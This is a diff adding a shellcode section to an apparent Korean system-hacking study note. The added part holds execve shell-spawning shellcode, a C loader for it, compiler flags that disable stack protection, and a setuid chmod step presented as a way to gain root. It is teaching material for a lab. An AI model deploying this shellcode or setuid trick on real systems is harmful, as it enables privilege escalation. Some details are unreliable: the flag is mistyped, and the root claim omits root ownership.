@@ -211,3 +211,24 @@ Text 영역 : 우리가 작성한 소스 코드, 시스템이 알아들을 수 �
 [strace_image]
 
 더욱 구체적이고 좋은 디버깅 툴을 이용할 것인데 이 도구는 깃허브에서 제공한다. `git clone https://github.com/pwndbg/pwndbg` 을 입력하여 pwndbg를 다운받는다. 디버깅할 폴더로 이동하여 `gdb 해당파일이름`을 통해 디버깅을 하게 된다. Breaking point를 `break * _start`와 같이 지정해 `run`으로 실행하고, `ni`라는 명령어로 한줄씩 next instruction 한다.
+
+>Shell code
+
+명령 Shell을 실행 시켜 해킹을 당하는 서버 컴퓨터를 제어하도록 하는 코드이다.
+특정한 소프트웨어의 버퍼오버플로우 같은 취약점 등을 이용한 쉘 코드를 이용할 수 있다. 루트 권한으로 실행된다면 장악할 수 있다. 예) 명령 프롬프트   
+
+```C
+#include <stdio.h>
+#include <string.h>
+
+char shell[] =  "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
+
+void main() {
+        printf("length : %d bytes\n", strlen(shell));
+        (*(void( *)()) shell)();
+        return 0;
+}
+```
+해당 Shell code는 Google에 검색하면 찾을 수 있다.   
+기본적으로 최신의 OS는 프로그램 컴파일시 스택 프로텍터 같은 것으로 프로그램이 실행될 때 마다 디렉터리나 파일등의 메모리 주소등이 계속 변화한다. 실습과정에서는 이러한 보호기법을 모두 끄고 하게 될 것이다.
+`gcc --fno-stack-protector -mpreferred-stack-boundary=4 -z execstack shell.c -o shell` 이렇게 만들어진 쉘 프로그램은 `chmod 4775 shell`로 해당 프로그램을 실행하면 루트권한을 얻을 수 있게 한다. 일반적인 유저권한으로 해당 프로그램을 실행하면 루트권한을 따게 되어 모든 작업을 할 수 있게 된다.
